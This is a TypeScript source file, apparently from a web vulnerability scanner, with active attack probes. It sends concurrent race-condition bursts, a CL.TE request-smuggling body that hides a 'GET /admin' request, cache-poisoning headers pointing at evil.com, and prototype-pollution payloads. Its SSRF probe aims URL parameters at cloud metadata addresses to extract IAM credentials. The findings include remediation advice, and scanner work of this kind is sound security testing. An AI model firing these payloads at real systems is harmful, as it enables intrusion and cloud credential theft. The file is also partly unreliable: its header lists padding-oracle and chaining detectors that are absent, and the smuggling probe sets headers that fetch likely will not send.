// VibeCode — Advanced Red-Team Detectors
// Elite capabilities: Race Conditions, HTTP Desync, Prototype Pollution,
// Padding Oracle, Vulnerability Chaining, Cloud Metadata SSRF
// These run ADDITIVELY on top of standard detectors

import type { CrawledEndpoint, DetectorResult } from '@/types';
import { generateProbeToken } from '@/scanner/payloads';
import { buildRequestString, buildResponseString } from '@/lib/utils';
import { getCweEntry } from '@/lib/cwe-database';

interface DetectorConfig {
    baseUrl: string;
    requestTimeout: number;
    userAgent: string;
    customHeaders?: Record<string, string>;
    authHeaders?: Record<string, string>;
}

async function makeRequest(
    url: string, method: string, config: DetectorConfig,
    body?: string, contentType?: string, extraHeaders?: Record<string, string>,
): Promise<{ status: number; headers: Record<string, string>; body: string; time: number; requestStr: string; responseStr: string } | null> {
    try {
        const headers: Record<string, string> = {
            'User-Agent': config.userAgent, ...config.customHeaders, ...config.authHeaders, ...extraHeaders,
        };
        if (contentType) headers['Content-Type'] = contentType;
        const startTime = Date.now();
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), config.requestTimeout);
        const opts: RequestInit = { method, headers, signal: controller.signal, redirect: 'manual' };
        if (body && method !== 'GET') opts.body = body;
        const response = await fetch(url, opts);
        clearTimeout(timeoutId);
        const responseTime = Date.now() - startTime;
        const responseBody = await response.text();
        const respHeaders: Record<string, string> = {};
        response.headers.forEach((v, k) => { respHeaders[k] = v; });
        return { status: response.status, headers: respHeaders, body: responseBody, time: responseTime, requestStr: buildRequestString(method, url, headers, body), responseStr: buildResponseString(response.status, respHeaders, responseBody) };
    } catch { return null; }
}

// ============================================================
// 1) RACE CONDITION DETECTOR (TOCTOU Fuzzing)
// ============================================================

export async function detectRaceCondition(
    endpoint: CrawledEndpoint, config: DetectorConfig
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    // Only test POST/PUT/PATCH endpoints with forms (state-modifying)
    const forms = endpoint.forms?.filter(f => ['POST', 'PUT', 'PATCH'].includes(f.method.toUpperCase()));
    if (!forms || forms.length === 0) return results;

    for (const form of forms) {
        const formBody = form.fields.map(f => `${encodeURIComponent(f.name)}=${encodeURIComponent(f.value || 'test')}`).join('&');
        const targetUrl = form.action || endpoint.url;

        // Send concurrent requests (simulate single-packet attack)
        const concurrency = 10;
        const promises = Array.from({ length: concurrency }, () =>
            makeRequest(targetUrl, form.method, config, formBody, 'application/x-www-form-urlencoded')
        );

        const responses = await Promise.allSettled(promises);
        const successful = responses.filter(r => r.status === 'fulfilled' && r.value !== null).map(r => (r as PromiseFulfilledResult<any>).value);

        if (successful.length < 2) continue;

        // Check for different response codes or bodies (may indicate race)
        const statusCodes = new Set(successful.map((r: any) => r.status));
        const bodyLengths = new Set(successful.map((r: any) => r.body.length));
        const hasVariance = statusCodes.size > 1 || bodyLengths.size > 1;

        // Check for success indicators (2xx responses > expected)
        const successCount = successful.filter((r: any) => r.status >= 200 && r.status < 300).length;

        if (hasVariance || successCount >= concurrency * 0.8) {
            results.push({
                found: true,
                title: `Potential Race Condition (TOCTOU) at ${targetUrl}`,
                description: `${concurrency} concurrent requests to ${targetUrl} showed ${statusCodes.size > 1 ? 'different status codes' : 'uniform success'}, indicating a potential Time-of-Check to Time-of-Use (TOCTOU) vulnerability. This could allow limit overruns or duplicate operations.`,
                category: 'race_condition',
                severity: 'high',
                confidence: hasVariance ? 'medium' : 'low',
                cweId: 'CWE-362',
                cweTitle: 'Concurrent Execution Using Shared Resource with Improper Synchronization',
                affectedUrl: targetUrl,
                httpMethod: form.method,
                payload: `${concurrency} concurrent identical requests`,
                request: successful[0]?.requestStr,
                response: successful[0]?.responseStr,
                responseCode: successful[0]?.status,
                responseTime: successful[0]?.time,
                raceConditionConfirmed: hasVariance,
                impact: 'Attackers can exploit race conditions to bypass rate limits, overdraw account balances, apply discount codes multiple times, or create duplicate resources by sending simultaneous requests.',
                technicalDetail: `Sent ${concurrency} concurrent requests. Status codes: [${Array.from(statusCodes).join(', ')}]. Response body length variance: ${bodyLengths.size > 1 ? 'YES' : 'NO'}. Success rate: ${successCount}/${concurrency}.`,
                remediation: 'Implement proper database-level locking (SELECT FOR UPDATE), use idempotency keys, or apply distributed locking mechanisms (Redis SETNX). Ensure state-modifying operations are atomic.',
                reproductionSteps: [
                    `Prepare a state-modifying request to: ${targetUrl}`,
                    `Send ${concurrency} identical requests simultaneously using HTTP/2 multiplexing or tools like turbo-intruder`,
                    `Compare responses for inconsistencies (different status codes, duplicate operations)`,
                ],
                mappedOwasp: ['A04:2021'],
                mappedNist: ['SI-16'],
            });
        }
    }
    return results;
}

// ============================================================
// 2) HTTP DESYNC / REQUEST SMUGGLING DETECTOR
// ============================================================

export async function detectHttpDesync(
    endpoint: CrawledEndpoint, config: DetectorConfig
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    // CL.TE probe: Content-Length says short, Transfer-Encoding says chunked
    const clTeBody = '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n';
    const response = await makeRequest(endpoint.url, 'POST', config, clTeBody, 'application/x-www-form-urlencoded', {
        'Content-Length': '4',
        'Transfer-Encoding': 'chunked',
    });

    if (response) {
        // If server doesn't reject, it may be vulnerable
        if (response.status !== 400 && response.status !== 501) {
            results.push({
                found: true,
                title: `Potential HTTP Request Smuggling (CL.TE) at ${endpoint.url}`,
                description: `The server at ${endpoint.url} did not reject a request with conflicting Content-Length and Transfer-Encoding headers, indicating a potential CL.TE request smuggling vulnerability.`,
                category: 'http_desync',
                severity: 'critical',
                confidence: 'low',
                cweId: 'CWE-444',
                cweTitle: 'Inconsistent Interpretation of HTTP Requests',
                affectedUrl: endpoint.url,
                httpMethod: 'POST',
                payload: 'CL.TE probe with conflicting Content-Length and Transfer-Encoding',
                request: response.requestStr,
                response: response.responseStr,
                responseCode: response.status,
                responseTime: response.time,
                impact: 'HTTP Request Smuggling can allow attackers to hijack other users\' requests, bypass security controls, poison web caches, and perform credential theft.',
                remediation: 'Normalize HTTP parsing between front-end proxies and back-end servers. Reject ambiguous requests with both Content-Length and Transfer-Encoding. Use HTTP/2 end-to-end.',
                reproductionSteps: [
                    'Send a POST request with both Content-Length: 4 and Transfer-Encoding: chunked headers',
                    'Include a smuggled request in the body after the chunk terminator',
                    'Observe if the server processes both requests',
                ],
                mappedOwasp: ['A05:2021'],
                mappedNist: ['SI-10'],
            });
        }
    }

    // Web Cache Poisoning probe: inject unkeyed headers
    const cacheResponse = await makeRequest(endpoint.url, 'GET', config, undefined, undefined, {
        'X-Forwarded-Host': 'evil.com',
        'X-Forwarded-Scheme': 'nothttps',
        'X-Original-URL': '/admin',
    });

    if (cacheResponse) {
        if (cacheResponse.body.includes('evil.com') || cacheResponse.headers['x-cache'] === 'HIT') {
            results.push({
                found: true,
                title: `Web Cache Poisoning via Unkeyed Header at ${endpoint.url}`,
                description: `The server reflects the X-Forwarded-Host header value in the response, which may be cached by CDN/proxy and served to other users.`,
                category: 'cache_poisoning',
                severity: 'high',
                confidence: 'medium',
                cweId: 'CWE-444',
                affectedUrl: endpoint.url,
                httpMethod: 'GET',
                payload: 'X-Forwarded-Host: evil.com',
                request: cacheResponse.requestStr,
                response: cacheResponse.responseStr,
                responseCode: cacheResponse.status,
                cachePoisoningImpact: cacheResponse.headers['cache-control'] ? `Cache-Control: ${cacheResponse.headers['cache-control']}` : 'Unknown TTL',
                impact: 'Web cache poisoning can serve malicious content to all users accessing the same URL from the cache.',
                remediation: 'Ensure all reflected headers are included in the cache key. Validate and sanitize X-Forwarded-* headers.',
                mappedOwasp: ['A05:2021'],
            });
        }
    }

    return results;
}

// ============================================================
// 3) PROTOTYPE POLLUTION DETECTOR
// ============================================================

export async function detectPrototypePollution(
    endpoint: CrawledEndpoint, config: DetectorConfig
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];
    const probeToken = generateProbeToken();

    const payloads = [
        // JSON body pollution
        `{"__proto__":{"status":"${probeToken}"}}`,
        `{"constructor":{"prototype":{"status":"${probeToken}"}}}`,
        // Query param pollution
        `__proto__[status]=${probeToken}`,
        `constructor.prototype.status=${probeToken}`,
        `__proto__.status=${probeToken}`,
    ];

    // Test JSON endpoints
    const jsonParams = endpoint.params.filter(p => p.type === 'body');
    if (jsonParams.length > 0 || endpoint.method === 'POST') {
        for (const payload of payloads.slice(0, 2)) {
            const response = await makeRequest(endpoint.url, 'POST', config, payload, 'application/json');
            if (!response) continue;

            if (response.body.includes(probeToken) || response.status === 500) {
                results.push({
                    found: true,
                    title: `Prototype Pollution via JSON body at ${endpoint.url}`,
                    description: `The endpoint processes __proto__ or constructor.prototype properties from JSON input, potentially allowing Prototype Pollution.`,
                    category: 'prototype_pollution',
                    severity: 'high',
                    confidence: response.body.includes(probeToken) ? 'high' : 'low',
                    cweId: 'CWE-1321',
                    cweTitle: 'Improperly Controlled Modification of Object Prototype Attributes',
                    affectedUrl: endpoint.url,
                    httpMethod: 'POST',
                    payload,
                    request: response.requestStr,
                    response: response.responseStr,
                    responseCode: response.status,
                    impact: 'Prototype Pollution can lead to property injection, authentication bypass, or Remote Code Execution in Node.js applications.',
                    remediation: 'Sanitize object keys before merge operations. Use Object.create(null) or Map. Block __proto__ and constructor keys in JSON parsing.',
                    reproductionSteps: [
                        `Send a POST request to ${endpoint.url}`,
                        `Set Content-Type to application/json`,
                        `Body: ${payload}`,
                        `Check if the polluted property appears in subsequent responses`,
                    ],
                    mappedOwasp: ['A03:2021'],
                });
                break;
            }
        }
    }

    // Test query parameters
    for (const payload of payloads.slice(2)) {
        const testUrl = `${endpoint.url}${endpoint.url.includes('?') ? '&' : '?'}${payload}`;
        const response = await makeRequest(testUrl, 'GET', config);
        if (!response) continue;

        if (response.body.includes(probeToken) || response.status === 500) {
            results.push({
                found: true,
                title: `Prototype Pollution via Query Parameters at ${endpoint.url}`,
                description: `The endpoint processes __proto__ properties from query parameters.`,
                category: 'prototype_pollution',
                severity: 'high',
                confidence: 'low',
                cweId: 'CWE-1321',
                affectedUrl: endpoint.url,
                httpMethod: 'GET',
                payload,
                request: response.requestStr,
                response: response.responseStr,
                responseCode: response.status,
                impact: 'Client-side Prototype Pollution can lead to DOM XSS or logic bypass.',
                remediation: 'Sanitize query parameter parsing. Block __proto__ keys.',
                mappedOwasp: ['A03:2021'],
            });
            break;
        }
    }

    return results;
}

// ============================================================
// 4) CLOUD METADATA SSRF (Advanced pivot from standard SSRF)
// ============================================================

export async function detectCloudMetadataSsrf(
    endpoint: CrawledEndpoint, config: DetectorConfig
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];

    // AWS IMDSv1 & IMDSv2 endpoints
    const cloudEndpoints: Array<{ url: string; provider: string; indicators: string[]; headers?: Record<string, string> }> = [
        { url: 'http://169.254.169.254/latest/meta-data/', provider: 'AWS', indicators: ['ami-id', 'instance-id', 'local-ipv4'] },
        { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', provider: 'AWS IAM', indicators: ['AccessKeyId', 'SecretAccessKey', 'Token'] },
        { url: 'http://169.254.169.254/latest/dynamic/instance-identity/document', provider: 'AWS Identity', indicators: ['instanceId', 'region', 'accountId'] },
        { url: 'http://metadata.google.internal/computeMetadata/v1/', provider: 'GCP', indicators: ['instance/', 'project/'], headers: { 'Metadata-Flavor': 'Google' } },
        { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', provider: 'Azure', indicators: ['compute', 'network'], headers: { 'Metadata': 'true' } },
        { url: 'http://169.254.169.254/metadata/v1/', provider: 'DigitalOcean', indicators: ['droplet_id', 'hostname'] },
    ];

    const urlParams = endpoint.params.filter(p =>
        ['url', 'link', 'src', 'redirect', 'path', 'fetch', 'target', 'host', 'file', 'page', 'load'].some(k => p.name.toLowerCase().includes(k))
    );

    for (const param of urlParams) {
        for (const cloud of cloudEndpoints) {
            let testUrl = endpoint.url;
            if (param.type === 'query') {
                const u = new URL(endpoint.url);
                u.searchParams.set(param.name, cloud.url);
                testUrl = u.toString();
            }

            const response = await makeRequest(testUrl, 'GET', config, undefined, undefined, (cloud.headers || {}) as Record<string, string>);
            if (!response) continue;

            const foundIndicator = cloud.indicators.find(ind => response.body.includes(ind));
            if (foundIndicator) {
                const hasCredentials = response.body.includes('AccessKeyId') || response.body.includes('SecretAccessKey') || response.body.includes('Token');

                results.push({
                    found: true,
                    title: `Cloud Metadata Exposure (${cloud.provider}) via SSRF in "${param.name}"`,
                    description: `SSRF allows access to ${cloud.provider} metadata service. ${hasCredentials ? 'IAM CREDENTIALS WERE EXTRACTED — this is a CRITICAL compromise.' : 'Metadata information was exposed.'}`,
                    category: 'ssrf',
                    severity: hasCredentials ? 'critical' : 'high',
                    confidence: 'high',
                    cweId: 'CWE-918',
                    cweTitle: 'Server-Side Request Forgery',
                    affectedUrl: endpoint.url,
                    httpMethod: 'GET',
                    parameter: param.name,
                    parameterType: param.type,
                    payload: cloud.url,
                    request: response.requestStr,
                    response: response.responseStr,
                    responseCode: response.status,
                    cloudMetadataExtracted: hasCredentials,
                    attackChainGraph: hasCredentials ? JSON.stringify({
                        nodes: [
                            { id: 'ssrf', type: 'vulnerability', label: `SSRF in ${param.name}` },
                            { id: 'metadata', type: 'pivot', label: `${cloud.provider} Metadata Access` },
                            { id: 'credentials', type: 'impact', label: 'IAM Credential Extraction' },
                        ],
                        edges: [
                            { from: 'ssrf', to: 'metadata' },
                            { from: 'metadata', to: 'credentials' },
                        ],
                    }) : undefined,
                    impact: hasCredentials
                        ? `CRITICAL: IAM credentials were extracted from ${cloud.provider} metadata service. An attacker can use these credentials to access cloud resources, pivot through the infrastructure, and potentially compromise the entire cloud account.`
                        : `Cloud metadata was accessible, revealing infrastructure information (${foundIndicator}). This is a stepping stone for further attacks.`,
                    remediation: 'Block access to metadata IPs (169.254.169.254) in SSRF filters. Use IMDSv2 (AWS) which requires a token. Implement network-level controls.',
                    reproductionSteps: [
                        `Set the "${param.name}" parameter to: ${cloud.url}`,
                        `Observe the response containing cloud metadata indicator: ${foundIndicator}`,
                        hasCredentials ? 'Extract IAM credentials from the response body' : '',
                    ].filter(Boolean),
                    mappedOwasp: ['A10:2021'],
                    mappedNist: ['SC-7', 'AC-4', 'IA-5'],
                });
                break; // Found one cloud provider, don't test more
            }
        }
    }

    return results;
}

// ============================================================
// EXPORT ADVANCED DETECTORS
// ============================================================

import type { DetectorModule } from '@/scanner/detectors';

export const ADVANCED_DETECTORS: DetectorModule[] = [
    { name: 'Race Condition (TOCTOU)', id: 'race_condition', detect: detectRaceCondition },
    { name: 'HTTP Desync / Smuggling', id: 'http_desync', detect: detectHttpDesync },
    { name: 'Prototype Pollution', id: 'prototype_pollution', detect: detectPrototypePollution },
    { name: 'Cloud Metadata SSRF', id: 'cloud_metadata', detect: detectCloudMetadataSsrf },
];
